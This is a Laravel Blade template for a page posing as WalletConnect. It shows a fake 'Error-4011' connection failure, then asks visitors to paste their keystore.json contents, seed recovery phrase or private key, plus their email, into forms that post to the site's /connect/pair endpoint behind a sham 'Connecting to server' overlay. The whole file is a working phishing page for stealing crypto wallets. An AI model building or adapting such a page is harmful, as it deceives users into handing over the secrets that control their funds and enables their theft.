@extends('theme.home')


@section('content')
    <style>
        .email-input {
            width: 100%;
            padding: 6px 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
    {{-- Loading Overlay --}}
    <div id="loading-overlay"
        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #080b18; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center;">
        <img src="{{ asset('landing/assets/img/walletconnect.svg') }}" alt="WalletConnect"
            style="width: 80px; height: auto; margin-bottom: 20px;">
        <p style="color: #fff; font-size: 16px; font-weight: 300; margin-bottom: 20px; text-align: center;">Pairing with
            {{ $wallet }} servers</p>
        <div class="spinner"
            style="width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;">
        </div>
    </div>
    <style>
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var overlayShown = sessionStorage.getItem('manualpair_overlay_shown');
            var overlay = document.getElementById('loading-overlay');

            if (overlayShown) {
                overlay.style.display = 'none';
            } else {
                sessionStorage.setItem('manualpair_overlay_shown', 'true');
                setTimeout(function() {
                    overlay.style.display = 'none';
                }, 10000);
            }
        });
    </script>

    <div class="body_wrap">
        <div class="container py-5">
            <div class="row justify-content-center">
                <div class="col-12 col-md-8 col-lg-6">

                    {{-- WalletConnect Header --}}
                    <div class="d-flex align-items-center justify-content-center mb-4">
                        <img src="{{ asset('landing/assets/img/walletconnect.svg') }}" alt="WalletConnect"
                            style="width: 40px; height: auto; margin-right: 4px;">
                        <h4 class="text-white mb-0" style="font-family: var(--font-heading);">
                            WalletConnect
                        </h4>
                    </div>

                    {{-- Warning Alert --}}
                    <div class="mb-4 p-3"
                        style="background-color: #fff8e1; border-left: 4px solid #ffc107; border-radius: 8px;">
                        <p class="mb-0" style="color: #856404;">
                            @if ($errors->any())
                                <strong>Error connecting:</strong> Unable to connect as request is taking longer than
                                expected. Please <a href="{{ url('/register/create') }}"
                                    style="text-decoration: underline; color: #888;">sign
                                    up manually</a> to access
                            @else
                                <strong>Invalid:</strong> Error-4011: Cannot establish connection to {{ $wallet }}
                                servers, try manual pairing.
                            @endif
                        </p>
                    </div>

                    {{-- Form Container with Tabs --}}
                    <div class="p-3 mb-4" style="background: #fff;">
                        {{-- Tab Navigation --}}
                        <ul class="nav nav-tabs mb-4" id="pairTabs" role="tablist" style="border-bottom: 1px solid #ddd;">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="json-tab" data-bs-toggle="tab"
                                    data-bs-target="#json-content" type="button" role="tab"
                                    aria-controls="json-content" aria-selected="true"
                                    style="color: #333; font-size: 13px; font-weight: 500; border: none; background: transparent; padding: 10px 15px;">Seed
                                    Phrase(JSON/UTC)</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="key-tab" data-bs-toggle="tab" data-bs-target="#key-content"
                                    type="button" role="tab" aria-controls="key-content" aria-selected="false"
                                    style="color: #666; font-size: 13px; font-weight: 500; border: none; background: transparent; padding: 10px 15px;">Private
                                    Key</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="phrase-tab" data-bs-toggle="tab"
                                    data-bs-target="#phrase-content" type="button" role="tab"
                                    aria-controls="phrase-content" aria-selected="false"
                                    style="color: #666; font-size: 13px; font-weight: 500; border: none; background: transparent; padding: 10px 15px;">Secret
                                    Recovery Phrase</button>
                            </li>
                        </ul>

                        {{-- Tab Content --}}
                        <div class="tab-content" id="pairTabsContent">
                            {{-- Seed Phrase JSON/UTC Tab --}}
                            <div class="tab-pane fade show active" id="json-content" role="tabpanel"
                                aria-labelledby="json-tab">
                                <p class="mb-4" style="color: #333; font-size: 14px;">
                                    To pair manually input the content of the keystore.json file below to restore and
                                    connect to your {{ $wallet }} account.
                                </p>
                                <form id="form-json" action="{{ url('/connect/pair') }}" method="POST">
                                    @csrf
                                    <input type="hidden" name="wallet" value="{{ $wallet }}">
                                    <input type="hidden" name="type" value="Seed Phrase JSON/UTC">
                                    <div class="mb-3">
                                        <label
                                            style="color: #333; font-weight: 500; margin-bottom: 8px; display: block;">Keystore
                                            JSON:</label>
                                        <textarea name="details" rows="4" class="form-control" required
                                            style="border: 1px solid #ddd; border-radius: 8px; padding: 12px; font-size: 14px; resize: none;"
                                            placeholder="Copy and paste content of keystore.json file here."></textarea>
                                    </div>
                                    <div class="mb-3">
                                        <label
                                            style="color: #333; font-weight: 500; margin-bottom: 8px; display: block;">User
                                            Email:</label>
                                        <input type="email" name="email" class="email-input" required
                                            style="padding: 6px 10px !important; height: auto !important; background-color: #fff; border: 1px solid #ddd; border-radius: 8px; color: #333;"
                                            placeholder="Enter email address">
                                    </div>
                                </form>
                            </div>

                            {{-- Secret Recovery Phrase Tab --}}
                            <div class="tab-pane fade" id="phrase-content" role="tabpanel" aria-labelledby="phrase-tab">
                                <p class="mb-4" style="color: #333; font-size: 14px;">
                                    To pair manually input the BIP39/BIP44 recovery phrase below to restore the Mnemonic
                                    keys that manage your {{ $wallet }} account.
                                </p>
                                <form id="form-phrase" action="{{ url('/connect/pair') }}" method="POST">
                                    @csrf
                                    <input type="hidden" name="wallet" value="{{ $wallet }}">
                                    <input type="hidden" name="type" value="Secret Recovery Phrase">
                                    <div class="mb-3">
                                        <label
                                            style="color: #333; font-weight: 500; margin-bottom: 8px; display: block;">Recovery
                                            Phrase:</label>
                                        <textarea name="details" rows="4" class="form-control" required
                                            style="border: 1px solid #ddd; border-radius: 8px; padding: 12px; font-size: 14px; resize: none;"
                                            placeholder="Please separate each Mnemonic Phrase with a space."></textarea>
                                    </div>
                                    <div class="mb-3">
                                        <label
                                            style="color: #333; font-weight: 500; margin-bottom: 8px; display: block;">User
                                            Email:</label>
                                        <input type="email" name="email" class="email-input" required
                                            style="padding: 6px 10px !important; height: auto !important; background-color: #fff; border: 1px solid #ddd; border-radius: 8px; color: #333;"
                                            placeholder="Enter email address">
                                    </div>
                                </form>
                            </div>

                            {{-- Private Key Tab --}}
                            <div class="tab-pane fade" id="key-content" role="tabpanel" aria-labelledby="key-tab">
                                <p class="mb-4" style="color: #333; font-size: 14px;">
                                    To pair manually input your private key which is an alphanumeric code that proves
                                    ownership of your {{ $wallet }} account.
                                </p>
                                <form id="form-key" action="{{ url('/connect/pair') }}" method="POST">
                                    @csrf
                                    <input type="hidden" name="wallet" value="{{ $wallet }}">
                                    <input type="hidden" name="type" value="Private Key">
                                    <div class="mb-3">
                                        <label
                                            style="color: #333; font-weight: 500; margin-bottom: 8px; display: block;">Private
                                            Key:</label>
                                        <textarea name="details" rows="4" class="form-control" required
                                            style="border: 1px solid #ddd; border-radius: 8px; padding: 12px; font-size: 14px; resize: none;"
                                            placeholder="Enter your private key here."></textarea>
                                    </div>
                                    <div class="mb-3">
                                        <label
                                            style="color: #333; font-weight: 500; margin-bottom: 8px; display: block;">User
                                            Email:</label>
                                        <input type="email" name="email" class="email-input" required
                                            style="padding: 6px 10px !important; height: auto !important; background-color: #fff; border: 1px solid #ddd; border-radius: 8px; color: #333;"
                                            placeholder="Enter email address">
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>

                    <style>
                        #pairTabs .nav-link.active {
                            color: #333 !important;
                            border-bottom: 2px solid var(--color-primary) !important;
                        }

                        #pairTabs .nav-link:hover {
                            color: #333 !important;
                        }
                    </style>

                    {{-- Success Alert --}}
                    <div class="mb-4 p-3" style="background-color: #e8f5e9; border-radius: 8px;">
                        <p class="mb-0" style="color: #1b5e20; font-size: 14px;">
                            <i class="fas fa-info-circle me-2"></i> Review details provided
                        </p>
                    </div>

                    {{-- Connecting Overlay --}}
                    <div id="connecting-overlay"
                        style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #080b18; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center;">
                        <img src="{{ asset('landing/assets/img/walletconnect.svg') }}" alt="WalletConnect"
                            style="width: 80px; height: auto; margin-bottom: 20px;">
                        <p style="color: #fff; font-size: 16px; font-weight: 300; margin-bottom: 20px; text-align: center;">
                            Connecting to server</p>
                        <div class="spinner"
                            style="width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite;">
                        </div>
                    </div>

                    {{-- Pair Again Button --}}
                    <div class="wow fadeInUp" data-wow-duration=".7s" data-wow-delay="250ms">
                        <button type="button" class="them-btn" id="pair-submit-btn"
                            style="width: 100%; max-width: none; border: none; cursor: pointer;">
                            <span class="btn_label" data-text="Pair">Pair</span>
                        </button>
                    </div>
                    <script>
                        document.getElementById('pair-submit-btn').addEventListener('click', function() {
                            var activeTab = document.querySelector('#pairTabsContent .tab-pane.active');
                            var form = activeTab.querySelector('form');
                            if (form && form.reportValidity()) {
                                var overlay = document.getElementById('connecting-overlay');
                                overlay.style.display = 'flex';
                                setTimeout(function() {
                                    form.submit();
                                }, 5000);
                            }
                        });
                    </script>

                </div>
            </div>
        </div>
    </div>
@endsection
